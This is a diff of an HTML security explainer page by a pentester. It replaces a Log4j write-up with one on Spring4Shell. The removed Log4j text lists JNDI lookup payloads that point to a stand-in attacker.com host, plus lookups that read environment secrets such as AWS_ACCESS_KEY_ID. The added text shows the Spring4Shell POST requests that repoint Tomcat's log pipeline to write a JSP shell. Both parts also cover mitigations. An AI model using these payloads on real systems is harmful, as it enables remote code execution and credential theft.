@@ -2,7 +2,7 @@
 
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <title>Know Log4j </title>
+    <title>Know Spring4Shell</title>
     <style>
         /* cspell:disable-file */
         /* webkit printing magic: print all background colors */
@@ -294,11 +294,25 @@
         .simple-table {
             margin-top: 1em;
             font-size: 0.875rem;
+            empty-cells: show;
+        }
+        
+        .simple-table td {
+            height: 29px;
+            min-width: 120px;
+        }
+        
+        .simple-table th {
+            height: 29px;
+            min-width: 120px;
+        }
+        
+        .simple-table-header-color {
+            background: rgb(247, 246, 243);
+            color: black;
         }
         
         .simple-table-header {
-            background: rgb(247, 246, 243);
-            color: black;
             font-weight: 500;
         }
         
@@ -792,174 +806,211 @@
 </head>
 
 <body>
-    <article id="0efcdcba-b40a-4cda-b23e-09a20c5d6fe0" class="page sans">
-        <header><img class="page-cover-image" src="Know%20Log4j%20089b6dfd7a9c44ffb829274db44afc41/images.png" style="object-position:center 51.47999999999999%" />
-            <div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="Know%20Log4j%20089b6dfd7a9c44ffb829274db44afc41/log4j-1.png" /></div>
-            <h1 class="page-title">Know Log4j </h1>
+    <article id="9734285c-fbe0-4de6-a206-f82cf6af2544" class="page sans">
+        <header><img class="page-cover-image" src="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/spring4shell.png" style="object-position:center 68.14%" />
+            <div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/download-removebg-preview.png" /></div>
+            <h1 class="page-title">Know Spring4Shell</h1>
         </header>
         <div class="page-body">
-            <p id="b1cc6e26-e4cc-42ab-9bd2-f01cfbb92d12" class="">
+            <p id="676db3dd-8763-4293-b303-c54a9a3f9b8d" class="">
             </p>
-            <h1 id="2c224c05-5949-4a8b-8b69-13c22c0e4bbc" class="">What is Log4j ?</h1>
-            <p id="cad66d4f-e9df-4160-a6e4-c82df2498df4" class="">
+            <h1 id="4c06cc71-1ff7-4882-b33e-70456ec216c5" class="">About Spring</h1>
+            <p id="e3ebb9e6-80a1-4f79-b858-baa7e4cfeb9b" class="">
             </p>
-            <p id="88d72bf9-cfb1-4f31-8b4b-bc439c2351ab" class="">Talking about log4j , it is a popular library for JAVA created in 2001 . This library mainly serves the purpose for logging .</p>
-            <p id="72452702-5b44-4f9b-af54-bdd9e4c25b3a" class="">
-            </p>
-            <p id="7b28b35b-0c25-4898-a7d8-1d9e71661835" class="">So , what a logging library does , is instead of using the print statement . The developer just uses a wrapper around the logging class or object . So instead of using print(line), the code would look like this:</p><pre id="0339bc7e-b36c-4649-94bb-9785ace1f96f"
-                class="code"><code>logging.INFO(“Application Started”)
-logging.WARN(“File Uploaded”)
-logging.DEBUG(“SQL Query Ran”)</code></pre>
-            <p id="6a273c2e-4d77-4f49-86bf-e72911e6432d" class="">
-            </p>
-            <p id="853be4f6-88fe-4b05-b30e-accf9347e2ec" class="">Then the application has a configuration file which says what log levels (INFO, WARN, DEBUG, etc.) to display. This way when there is a problem with the application, the developer can enable DEBUG mode and instantly get the messages they need
-                to identify the issue.</p>
-            <p id="5bb4a174-3f76-4167-a566-2523bed6e686" class="">
-            </p>
-            <p id="2720224e-ec94-4e23-acd0-044217b061f0" class="">Now, about log4j logging operation it allows us to log expression . From here we can say that log4j is expression based vulnerability / input validation vulnerability</p>
-            <p id="c5b108f3-648b-4201-93ee-102921933b3e" class="">
-            </p>
-            <hr id="505a4cf1-dddc-4b10-a2ed-3013e431c10d" />
-            <p id="a8a5ffe5-575f-4eaf-a967-671c6707bf6c" class="">
-            </p>
-            <h1 id="93be38a5-e06a-41ca-b840-3b8ebe4f6bfa" class="">Vulnerability Details</h1>
-            <p id="11657cf3-d173-4ec4-8985-d149a028bd7d" class="">The vulnerability introduced to log4j2 in version 2.0 -beta 9 . As JNDI (Java Naming and Directory Interface) lookup plugin was added to it .</p>
-            <p id="842e0826-cf4a-4839-b2e1-6c8da283568c" class="">
-            </p>
-            <p id="70bbcb80-ab8f-4a76-ad8c-dd90d92080c3" class="">This version of log4j allowed lookups to provide a way to add values to it’s configuration . Like <strong>Map Lookups , Environment lookups , JNDI lookups , System Properties lookups .</strong></p>
-            <p id="2dd6686e-590c-4863-87c4-e84db66043df"
+            <p id="27688e89-a4de-4441-9ca4-149d334e6bcd" class="">Spring is a framework in JAVA that uses data binding functionality to bind data stored within an HTTP request to certain objects used by an application. This is a very brief idea about the Spring framework.</p>
+            <p id="826562d9-d24e-4450-a891-0b4e99f1e0f5"
                 class="">
             </p>
-            <p id="de83dfd0-1b0f-43c3-99d1-b32e17db169d" class=""><span style="border-bottom:0.05em solid"><strong>Note: New version added Docker and Kubernetes lookups</strong></span></p>
-            <p id="f147fff9-7376-4353-8e30-f442489751e8" class="">
+            <p id="30d660a1-4594-4680-8b55-9dfa0e35b1bc" class="">Now if any of the systems are running this configuration then it’s vulnerable.</p>
+            <p id="9af5404f-6b5a-44c8-8a66-9e837e8b7286" class="">
             </p>
-            <h2 id="cd9b844e-98d6-4a40-93d8-275a09060d5b" class="">What make issue with JNDI so vulnerable ?</h2>
-            <p id="b9db79e1-1b4b-4178-95c7-2e5559fe7379" class="">As we talk about that this version allowed us JNDI lookup . So lets see issue in JNDI lookup</p>
-            <ul id="b8410c00-d6d5-4a96-b74e-376319a00239" class="bulleted-list">
-                <li style="list-style-type:disc">Allowing variables to be retrieved using JNDI</li>
+            <p id="fcf41a4a-fc91-4290-870a-b099e4f09b4a" class=""> </p>
+            <h2 id="2fea7d71-c527-464d-bef5-0d08d77b9796" class="">Technical Details</h2>
+            <p id="52446530-f074-4c78-bac7-2cbbfafeefd6" class=""> </p>
+            <ul id="1bef3bdb-e9ff-44dd-82cd-92505013e850" class="bulleted-list">
+                <li style="list-style-type:disc">JDK version 9+</li>
             </ul>
-            <ul id="ccd35dd3-90d2-459b-87cc-881d4a234f7d" class="bulleted-list">
-                <li style="list-style-type:disc">A number of protocols supported including LDAP, RMI , DNS</li>
+            <ul id="e92fac26-c7c6-4680-acb4-9bab774044d6" class="bulleted-list">
+                <li style="list-style-type:disc">Apache Tomcat for serving the application</li>
             </ul>
-            <p id="3fde6249-f895-4973-8377-77f16202d400" class="">
+            <ul id="2fee21aa-380b-4b25-9123-66ddd5d6a5a9" class="bulleted-list">
+                <li style="list-style-type:disc">Spring Framework Version 5.3.0 to 5.3.17 and 5.2.0 to 5.2.19 and below</li>
+            </ul>
+            <ul id="1cf15595-c126-4aaa-bfcf-8117fb82f316" class="bulleted-list">
+                <li style="list-style-type:disc">application built as a WAR file </li>
+            </ul>
+            <ul id="db8123d6-3469-4a04-b622-b3b82c701708" class="bulleted-list">
+                <li style="list-style-type:disc">spring-webmvc and/or spring-webflux </li>
+            </ul>
+            <p id="59e911f3-5e92-4526-a9bd-b2a88b93251c" class="">
             </p>
-            <p id="c83838c6-0217-405c-9a29-49fc9d82baed" class="">Lets talk how these issue affected lo4j library which is using JNDI API for lookups</p>
-            <p id="728c4742-2a08-4d79-886b-0052fb5d7dda" class="">
+            <p id="f0658c52-3f82-4c46-8cb2-3b6e1f60b31a" class="">So this is all about vulnerable configuration</p>
+            <p id="c83347a8-56e9-4cbe-862b-85732e19abbb" class="">
             </p>
-            <p id="6859951c-eb5b-4322-87fa-0f4e46f7c2f1" class="">Log4j will parse input and will look for any of the lookups and <strong>it treats all string arguments as format strings !</strong></p>
-            <p id="b577ef99-2ab6-4c12-b41c-950171ac95ea" class="">
+            <p id="5292c1cc-ab81-4670-b4b2-e7fa53ddbf03" class="">But there is a catch in this as at the same time two CVEs came out </p>
+            <p id="e96727fc-8559-48de-b368-18c8e9cecc90" class="">
             </p>
-            <p id="1bf54599-b679-44e3-8f35-89d02f581a51" class="">When a lookup is encountered it is processed automatically and JNDI start lookup with <strong>${jndi: . </strong>JNDI/LDAP remote code execution is well-know attack published at Blackhat by Alvaro Muñoz and Oleksandr Mirosh back in 2015. So
-                inshort LDAP can store JAVA objects via JAVA Serialization or JNDI References and these references can contain inforamtion that will be used to create an instance of an object which leads to RCE.</p>
-            <p id="fd34abdb-f029-489b-ad44-b533209bad85"
-                class="">
+            <h2 id="f4853c28-2eb8-43fa-83d1-45ebfb025470" class="">Duo Vulnerabilities</h2>
+            <p id="75a350d7-e3d5-4c12-a0d1-1e68560d5b4a" class="">
             </p>
-            <p id="14c8de19-7522-473d-8936-11175349f3e7" class="">More about JNDI/LDAP RCE </p>
-            <figure id="fc1e2491-0ce9-4fae-9e1b-4b8efae6c23e">
-                <div class="source"><a href="https://www.youtube.com/watch?v=Y8a5nB-vy78">https://www.youtube.com/watch?v=Y8a5nB-vy78</a></div>
+            <ol type="1" id="7ba63ba7-6afd-435c-9589-f27eda901a69" class="numbered-list" start="1">
+                <li>Spring4Shell - an RCE in Spring Core: This leverages class injection leading to a full RCE and very severe. The name &quot;Spring4Shell&quot; was picked because Spring Core is a ubiquitous library, similar to log4j.</li>
+            </ol>
+            <ol type="1" id="49cd3464-36af-4326-9107-a7a0f3973a9d" class="numbered-list" start="2">
+                <li>RCE in “Spring Cloud Function” - A <em>confirmed RCE</em> in <em>Spring Cloud Function</em> (&lt;=3.1.6 and &lt;=3.2.2).
+                    <p id="e559e1f4-012e-4836-b1f1-793b0000f225" class="">If you&#x27;re using the Spring Cloud Function library, you must upgrade to 3.1.7+ or 3.2.3+ to prevent an RCE attack.</p>
+                    <p id="1484249b-e0d5-44dd-adc2-f3f62c7e0c5f" class="">
+                    </p>
+                    <p id="4972133a-7225-4196-bd16-477c6732863a" class="">Let’s take a dive into this framework and find out what’s it is</p>
+                </li>
+            </ol>
+            <p id="5c859f76-8698-4f75-850c-11482b31434c" class="">
+            </p>
+            <hr id="73c89751-05b1-459f-a5d7-3c8f15cccb7b" />
+            <p id="c0777c9f-b99e-4e78-8ca5-a911e8432e39" class="">
+            </p>
+            <h2 id="84c365b6-b74f-4494-ac35-41009ca56b55" class="">Dive in Spring Framework</h2>
+            <p id="617cadbd-dc72-4036-bdd3-e83ecfae4595" class="">
+                <div class="indented">
+                    <p id="5b7803ff-b33a-4aac-bfdb-689cf55e1206" class="">It is a java-based framework used for building web apps with JEE (JAVA Enterprise Edition) platform and it has an extension k<strong>nown</strong> as <mark class="highlight-orange"><strong>Spring Boot</strong></mark><strong>.</strong></p>
+                    <p
+                        id="a56b6b50-dded-444c-b7b0-3d8d6ef85d57" class="">Talking about core logic of this framework is <a href="https://stackoverflow.com/questions/130794/what-is-dependency-injection">dependency injection</a>.</p>
+            <p id="aeeabe5d-7d03-4ec8-9603-637c76132f00" class="">
+            </p>
+            <p id="d78e5fa1-dc12-4825-8011-8bca25cee984" class="">
+            </p>
+            <h3 id="819d9aa3-6545-4608-913f-1617055c0b5f" class="">Now time to see how developers use this framework</h3>
+            <p id="fcf715e7-0865-454b-8d17-9c437913d191" class="">
+            </p>
+            </div>
+            </p>
+            <p id="f86d1eaa-9af0-4dc3-adcb-f5f1d5019cb0" class="">Talking what spring does is just simple map user requests to Java objects in the backend. Let’s learn from an example</p>
+            <p id="30febc34-4e0a-42b0-81e1-efe6a1b3998b" class="">
+            </p>
+            <p id="1cbdeeb5-b579-4833-8bed-9e87919fed56" class="">A demo object class we have that has a string attribute message.</p>
+            <p id="63ffa546-ceaa-469d-a240-cd47dae12ecd" class="">
+            </p>
+            <figure id="79219606-9fc3-4e10-accb-4dce7fdc87a0" class="image">
+                <a href="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/demoobject-1.jpg"><img style="width:800px" src="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/demoobject-1.jpg" /></a>
+                <figcaption>Demo Object as its object</figcaption>
             </figure>
-            <p id="3c70dd49-9179-4ab3-be92-aadfb9abe05a" class="">
+            <p id="c5121adb-75ff-40aa-8c94-d9ea7041b615" class="">
             </p>
-            <hr id="e8f3b6bb-263c-4f1a-a038-6308fe6dfd88" />
-            <p id="f1afbcbb-92d8-441d-98db-25e2b16a994c" class="">
+            <p id="702758f3-6ad7-44cc-b8ec-e00efcf00554" class="">Now spring comes into play to map this class with web requests.</p>
+            <p id="86a92fef-2bc3-41e5-8a6b-74d48d2bb48e" class="">
             </p>
-            <h1 id="9e49289f-7abe-4cfa-96d3-5c5c246fce4a" class="">Expolitation </h1>
-            <h3 id="8fe87603-fcb1-45c6-b74d-73d25503c792" class=""> ※ An attacker must submit a JNDI lookup that points to their server</h3>
-            <p id="d80ddc57-5fbd-49ec-a3cd-1c1d586fe6d9" class="">
+            <p id="dfab9a73-01ea-4681-8256-e859e3837bcf" class="">In the below code we can see that mapping magic, talking about mapping spring provides a controller. Now what this code does, when a user submits parameters through a browser. This code redirect requests to the requested component like here
+                it is DemoObject.</p>
+            <p id="89b729d0-5d95-4fed-9576-1cf593ec584b" class="">
             </p>
-            <p id="6e1e55db-1fab-400f-915b-6ffcc29a001e" class="">${jndi:ldap://attacker.com:1234/a}</p>
-            <p id="97495b09-8bad-4844-b94a-14e9614f9f48" class="">
-            </p>
-            <h3 id="70c6b140-d542-4139-8db8-084f5cac1bc2" class="">※ Using RMI </h3>
-            <p id="80327457-9db2-41cb-80ba-c833a54bf413" class="">
-            </p>
-            <p id="a08a4cb1-16af-41d8-8b94-39190b180636" class="">${jndi:rmi://attacker.com:9191/a}</p>
-            <p id="8b80bdbe-727c-4e44-add4-f4ba463c0ff6" class="">
-            </p>
-            <p id="973355c2-ff95-4c3b-bd98-d5b9d192f9d5" class=""><span style="border-bottom:0.05em solid"><strong>• So What actually happens when this hit a log4j vulnerable applications </strong></span></p>
-            <ul id="5dd4ca69-1244-43ab-aa1a-a712d944d676" class="bulleted-list">
-                <li style="list-style-type:disc">It will try to resolve/lookup the entry</li>
-            </ul>
-            <ul id="0a340f0c-9589-44ce-9860-d4b43b29ddc9" class="bulleted-list">
-                <li style="list-style-type:disc">An LDAP request is sent to the attacker</li>
-            </ul>
-            <ul id="6889176e-3c1e-4d09-9741-f6f60097f20e" class="bulleted-list">
-                <li style="list-style-type:disc">The attacker now replies with a JNDI reference will point to another server hosting class and attacker could reply with a serialized object.</li>
-            </ul>
-            <p id="fcc9bf32-8071-4ceb-92b1-eeede7c729a5" class="">
-            </p>
-            <p id="314c11bd-a3dd-4773-af97-7e28625cadd3" class="">
-            </p>
-            <p id="3b15ec4e-9c26-4ee1-b69b-6770c0f311ae" class=""><span style="border-bottom:0.05em solid"><strong>• Attacker Replies with a JNDI reference </strong></span></p>
-            <p id="05f799e1-ecca-4247-b6bc-344e3225c7e1" class="">
-            </p>
-            <ul id="80f07367-26e3-4029-b87f-bbb7b5de8f5d" class="bulleted-list">
-                <li style="list-style-type:disc">The reference is followed</li>
-            </ul>
-            <ul id="53bc6a7d-39e1-4ddf-9e43-8cf79d9aa0b9" class="bulleted-list">
-                <li style="list-style-type:disc">A class is downloaded</li>
-            </ul>
-            <ul id="f0bc7884-7200-4d12-befe-95dad533a467" class="bulleted-list">
-                <li style="list-style-type:disc">The class gets executed and shazam u got shell</li>
-            </ul>
-            <p id="3bd83233-9f3b-4a40-aa9a-506c7f21bb7f" class="">
-            </p>
-            <p id="4aa2fbdc-9af7-4e9a-899b-d24ca8a18661" class="">POC</p>
-            <figure id="d4fbb0e3-e8e0-4adc-9c14-6aac8bac7b3c">
-                <div class="source"><a href="https://youtu.be/kyHdolL0Zt0">https://youtu.be/kyHdolL0Zt0</a></div>
+            <figure id="791d1489-aefd-4a37-8454-cd248953df5b" class="image">
+                <a href="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/democontroller-1.jpg"><img style="width:800px" src="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/democontroller-1.jpg" /></a>
+                <figcaption>Controller that maps the DemoObject to requests received at the server</figcaption>
             </figure>
-            <p id="b166b4ee-befe-4735-ae63-7c823cb924c1" class="">
+            <p id="2a1f480c-b9e2-4479-88a7-d0706144f69a" class="">
             </p>
-            <p id="605beaf1-4b9d-41e2-965b-1b75501e4119" class=""><strong>→ Similar steps can be used to reproduce attack using RMI</strong></p>
-            <p id="e4cc7514-9a8e-475f-bcb8-1eb5bb8ec2e6" class="">
+            <p id="0c2b4a0a-c588-47fa-94d2-63e6d5165a59" class="">Once our DemoObject gets mapped by spring it can be used with the message attribute as a variable in the HTML and then it can be rendered by the web browser.</p>
+            <figure id="807b2cf6-b58c-49ec-81c0-0aa6a9ca7085" class="image">
+                <a href="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/Untitled.png"><img style="width:612px" src="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/Untitled.png" /></a>
+                <figcaption>Adding the mapped message from our DemoObject using variable ${message}</figcaption>
+            </figure>
+            <p id="5e78d8fa-315e-449b-9c63-44f74f008047" class="">
             </p>
-            <p id="c314fcd5-214b-4ada-8483-0ce985e5a391" class="">• <strong>The JNDI resolver will automatically resolve DNS name </strong></p>
-            <p id="c380bf5c-18dc-4d75-a90e-471c8635e96b" class="">
+            <figure id="65838001-764e-46db-ac25-7dcfc24629f9" class="image">
+                <a href="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/Untitled%201.png"><img style="width:945px" src="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/Untitled%201.png" /></a>
+                <figcaption>Rendered out with user input </figcaption>
+            </figure>
+            <p id="c1dc5faf-b224-4f09-81f6-caf3e6ec2941" class="">
             </p>
-            <p id="ee6b4466-ba7d-49cd-acbe-21adf555febc" class="">This can be used to bypass and get access of sensitive data due to other lookups !</p>
-            <ul id="96b7facf-f17a-480d-8c11-a359ce19dd3f" class="bulleted-list">
-                <li style="list-style-type:disc">One can read environment variables with ${env</li>
-            </ul>
-            <ul id="74056b18-2be2-4d29-8c41-68e6976f6ddc" class="bulleted-list">
-                <li style="list-style-type:disc">Formatting is nestable!</li>
-            </ul>
-            <ul id="319b7d69-9dd5-4e11-9148-8781d0e9d496" class="bulleted-list">
-                <li style="list-style-type:disc">payload may for env : ${env:USER}, ${env:AWS_ACCESS_KEY_ID}</li>
-            </ul>
-            <p id="09a94e78-5f7c-4212-8313-6b61ceb1309f" class="">
+            <p id="83d0bc6b-4f69-42b5-8c1d-754d614aba7f" class="">So let’s see how we can take access through it.</p>
+            <p id="00fdb770-e78e-40cb-a010-8bfdaceaf19c" class="">
             </p>
-            <p id="a377c8ae-0d2c-44cf-b0d2-81059d725db6" class=""> </p>
-            <h2 id="8390ffa8-bff6-484c-a710-82849fada456" class="">• Anything that user supplies and gets parsed by log4j is potential input vector</h2>
-            <p id="2697ff55-7f79-4f0a-a538-aa2404f2f9ee" class="">
+            <hr id="5b8db02e-8dea-4da5-b47d-2e046bc83870" />
+            <p id="bb7b3e08-0a85-40d3-b612-542938c2c241" class="">
             </p>
-            <hr id="dee716d0-7cfa-4905-a9df-fa0b258e9417" />
-            <p id="bcb90b8e-c059-4850-a857-4472524e0c95" class="">
+            <h2 id="8bb75df7-b5e7-47b6-bf74-e6207fc9ad5d" class="">Taking Remote in Hand </h2>
+            <p id="2931743b-6df0-4c85-8a8b-5d0308c9beb9" class="">
             </p>
-            <h1 id="47e97a1f-53f9-4eb7-ad2c-2c2dd4ef076f" class="">Mitigations</h1>
-            <p id="2ab44cbf-6994-4df5-b771-b5ccb212a8aa" class="">
+            <p id="b48ca296-e918-498f-bb62-a2c373bb1080" class="">Before understanding this CVE, first, let’s get way back to the one old CVE to this framework. </p>
+            <p id="3097bc9e-8006-43ab-8ce3-132efd7112bd" class="">
             </p>
-            <p id="3f7c2d60-cc6d-404d-9b01-5ccf1408eb01" class="">There are two mitigations for this one is obvious to stay updated and other one is manual , here let see how its done manually</p>
-            <p id="ec045d5d-d07c-4214-a0f0-04b13c391177" class="">
+            <p id="a2f1585e-e3f9-4c57-bc6e-c64541092c7e" class=""><a href="http://blog.o0o.nu/2010/06/cve-2010-1622.html">CVE-2010-1622</a>. Spring MVC (<strong>M</strong>odel-<strong>V</strong>iew-<strong>C</strong>ontroller) is part of the Spring Framework which makes it easy to develop web applications
+                following the MVC design pattern. One of the features of Spring MVC is that it automatically instantiates and populates an object of a specified class when a request is made based on the parameters sent to the endpoint. In simple terms,
+                this could be abused to overwrite important attributes of the parent class, resulting in remote code execution.</p>
+            <p id="1ba077fe-2be5-4593-9ddb-7addaf4822af" class="">
             </p>
-            <p id="ab343700-fe30-4b10-8200-bd2d86b32ff4" class="">So , there is file <a href="http://solr.in.sh">solr.in.sh</a> which can be used for defensive purpose . But how ?</p>
-            <p id="cf5f3c98-d180-40ee-b2bb-ccd0efc9b5d2" class="">
+            <p id="4846ad63-de52-4189-b29f-f5803e126107" class=""><span style="border-bottom:0.05em solid"><strong>Spring4Shell works along similar lines, bypassing the mitigations that were added to patch </strong></span><a href="http://blog.o0o.nu/2010/06/cve-2010-1622.html"><span style="border-bottom:0.05em solid"><strong>CVE-2010-1622</strong></span></a>
+                <span
+                    style="border-bottom:0.05em solid"><strong>.</strong></span>
             </p>
-            <p id="a479451f-a3dc-46e4-a526-e9dfc5413b42" class="">Locate that file and add this specific syntax</p>
-            <p id="0181479d-3f78-4f18-be03-985bcfee7c77" class=""> </p><pre id="65ad3580-1ff7-49ad-99e7-a065309aeff5" class="code"><code>SOLR_OPTS=&quot;$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true&quot;</code></pre>
-            <p id="c42d9e29-38b9-4613-a034-7432c33e6dab" class="">
+            <p id="cf9357ff-4fe8-4c20-994d-c2825a5054c2" class="">
             </p>
-            <p id="c96fbe68-8604-4029-82d9-fd0541f80641" class="">after restarting service by init.d now no reply will be going to forwarded to curl </p>
-            <p id="587b649a-154d-45db-8bf1-17d9a82dda88" class="">
+            <p id="de2263e8-7802-4697-a1f1-22aeff2ef3fe" class="">Here are some ways to exploit this vulnerability</p>
+            <p id="e0212b93-8f8e-49f6-9679-7d200797cc7b" class="">
             </p>
-            <hr id="27858fad-14fd-4e53-98b2-4838ee2b0e2e" />
-            <figure id="089b6dfd-7a9c-44ff-b829-274db44afc41" class="image">
-                <a href="Know%20Log4j%20089b6dfd7a9c44ffb829274db44afc41/Kshitij_(Custom)-modified_(Custom).png"><img style="width:95px" src="Know%20Log4j%20089b6dfd7a9c44ffb829274db44afc41/Kshitij_(Custom)-modified_(Custom).png" /></a>
-            </figure><b><u><center><p id="05c74bca-98d8-40b1-8723-ec8203721dfb" class="" >Kshitij Raj </p></center></b></u><b></u><center><p id="57068522-18e8-4294-acc1-c59a5eaa5187" class="">Pentester and Security Researcher </p></center></b></u>
-            <p id="c0d8f886-471a-43e9-9ca7-646beec9bde2"
-                class="">
+            <h3 id="1fc7f42b-a63c-4ae5-9a30-010cb2a4ede9" class="">→ Overwriting the Tomcat logging directory</h3>
+            <p id="1253cf08-3e40-4750-a33f-98363ec9b6a2" class="">
+            </p>
+            <p id="5858fe76-7d63-46dd-a692-881a7dba2a57" class="">An attack can be done using a POST request as follows to overwrite the directory, where logging files are stored on the server-side.</p>
+            <p id="4017f793-1517-424c-9e1f-2be3b0d9deec" class="">
+            </p>
+            <p id="3bfc0d02-1473-44ab-b86a-c86ab9ceec95" class=""> </p><pre id="c9782ad2-f9db-4793-9a49-7b9b2708bb86" class="code code-wrap"><code>POST http://localhost:8080/s4sdemo/demoapp?class.module.classLoader.resources.context.parent.pipeline.first.directory=
+DIRECTORY_OF_CHOICE</code></pre>
+            <p id="04fbbcfb-f9fb-45cf-b078-1576af884dab" class="">
+            </p>
+            <h3 id="68d0e39f-b85a-4dea-aa73-ca0e20c0f191" class="">→ Setting up the prefix and suffix of the file to stored on the server</h3>
+            <p id="368f1bea-343a-4c52-8070-d508bacf0b71" class="">
+            </p>
+            <p id="5195a796-503f-4519-ae68-fd9771cce132" class="">An attacker’s POST request adds the prefix to the start of the wrtten log file . The suffix is for the file extension </p>
+            <p id="657dc573-4f58-4daf-9496-5a52dacb7003" class="">
+            </p><pre id="27374f97-2b59-4e5d-8e76-941a03aabd9c" class="code code-wrap"><code>POST http://localhost:8080/s4sdemo/demoapp?class.module.classLoader.resources.context.parent.pipeline.first.prefix=
+FILENAME_OF_CHOICE
+
+POST http://localhost:8080/s4sdemo/demoapp?class.module.classLoader.resources.context.parent.pipeline.first.suffix=
+EXTENSION_OF_CHOICE</code></pre>
+            <p id="18f7ea59-7855-42f1-bd72-59105ad073fc" class="">
+            </p>
+            <h3 id="8a5d10c9-6afa-421d-b347-823589921761" class="">→ Writing arbitrary payload into the created file</h3>
+            <p id="e4a59e2d-1153-4d36-89cc-1025e3bad597" class="">
+            </p>
+            <p id="18da9b81-1227-43e7-b11d-a883bfe3dacb" class="">An attacker can write an arbitrary payload into created.jsp file .</p><pre id="783bc693-6161-4e52-bb09-00075b1549d9" class="code code-wrap"><code>POST http://localhost:8080/s4sdemo/demoapp? class.module.classLoader.resources.context.parent.pipeline.first.pattern=
+EXPLOIT_PAYLOAD</code></pre>
+            <p id="7e2259a8-ffc6-432a-9bf4-3dab2b65ce9f" class="">
+            </p>
+            <h3 id="51b43d1c-f75b-4729-8970-330269cdd943" class="">→ Remotely calling the created.jsp file</h3>
+            <p id="95e4896f-fe0b-40ce-96b0-ef7b12bb181b" class="">
+            </p>
+            <p id="5be9d019-fa91-4976-b492-450a3cb72efb" class="">An attacker can then remotely call the created “<code>shell.jsp</code>,” which will execute the written payload and print the OS name</p>
+            <p id="b42ed62d-5d30-435c-b5da-66f6391e37a4" class="">
+            </p>
+            <p id="b970632e-07dc-4e69-9bd8-6eb60933131c" class="">
+            </p>
+            <hr id="175e8e10-1507-4da0-91e9-de7493583384" />
+            <p id="ad027150-b345-4b6c-bc07-4b5e202e767a" class="">
+            </p>
+            <p id="db7999d3-82a7-41fc-b060-ee4dae3db8fa" class="">
+            </p>
+            <h2 id="4b26c63c-02b3-41e2-a681-255444a0fde2" class="">Mitigations </h2>
+            <p id="6d483cec-900f-4b26-b81f-2db980b2608b" class="">A patch is now available as of March 31st, 2022 in the newest published <a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement">Spring versions 5.3.18 and 5.2.20</a>. We recommend all users update. For those unable
+                to update, the following mitigations are possible:</p>
+            <p id="386f1786-bdcd-402a-ab45-ad531f88895d" class="">
+            </p>
+            <p id="e906dbf5-6f28-4ada-98ce-341941688d3f" class="">According to the <a href="https://www.praetorian.com/blog/spring-core-jdk9-rce/">Praetorian post</a> confirming the presence of an RCE in Spring Core, the currently recommended approach for is to patch <code>DataBinder</code> by adding a blacklist
+                of vulnerable field patterns required for exploitation.</p>
+            <p id="168a5b16-2c90-4d09-adf5-0738c26312a0" class="">
+            </p>
+            <p id="37d93666-0679-460c-9c40-8961eb45b781" class="">
+            </p>
+            <hr id="44c3e434-3643-4201-a373-bfd7a250baf9" />
+            <figure id="c9951882-3072-4056-b655-1e50a1d72a0e" class="image">
+                <a href="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/Kshitij_(Custom)-modified_(Custom).png"><img style="width:95px" src="Know%20Spring4Shell%20792196069fc34e10accb4dce7fdc87a0/Kshitij_(Custom)-modified_(Custom).png" /></a>
+            </figure>
+            <p id="bcbeca1f-108e-463b-a13b-5f07e5608868" class=""> Kshitij Raj </p>
+            <p id="da87e1ba-c441-49bb-95be-e4ff87955d76" class=""> Pentester and Security Researcher </p>
+            <p id="914c7326-5279-4d58-963b-85a48df0e647" class="">
             </p>
             <a href="index.html">
-                <p id="049bebce-04a1-4c22-ade4-a7a675b90929" class="">&lt;&lt; Back to home</p>
+                <p id="c77d38b2-96c3-4903-a05a-41eba682c44b" class="">&lt;&lt; Back to home</p>
             </a>
         </div>
     </article>
